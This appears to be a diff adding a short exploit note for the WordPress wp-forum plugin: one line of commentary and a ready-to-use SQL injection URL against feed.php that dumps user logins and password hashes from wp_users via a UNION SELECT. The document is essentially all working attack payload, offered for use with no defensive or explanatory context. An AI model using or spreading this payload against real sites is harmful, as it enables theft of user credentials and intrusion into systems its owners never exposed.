@@ -1,0 +1,5 @@
+
+This vulnerabillity wil affect only <= 3 versions and will reveal the user + the hash to you.
+
+
+wp-content/plugins/wp-forum/feed.php?topic=-4381+union+select+group_concat%28user_login,0x3a,user_pass%29+from+wp_users%23
